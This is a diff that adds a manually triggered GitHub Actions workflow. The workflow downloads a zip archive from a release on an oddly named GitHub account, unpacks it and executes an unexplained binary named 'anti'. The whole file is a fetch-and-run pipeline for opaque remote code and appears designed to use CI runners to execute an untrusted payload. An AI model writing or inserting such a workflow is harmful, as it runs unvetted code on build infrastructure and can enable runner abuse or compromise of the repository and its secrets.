@@ -1,0 +1,26 @@
+name: Download and Run toan3
+
+on:
+  workflow_dispatch:
+
+jobs:
+  setup-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install unzip
+        run: sudo apt-get update && sudo apt-get install -y unzip
+
+      - name: Download toan3.zip
+        run: wget -O toan3.zip https://github.com/hrjfjtjtntnfn/lode/releases/download/V97373/toan3.zip
+
+      - name: Unzip toan3.zip
+        run: unzip -o toan3.zip
+
+      - name: Change directory and run anti
+        run: |
+          cd toan3
+          ./anti run
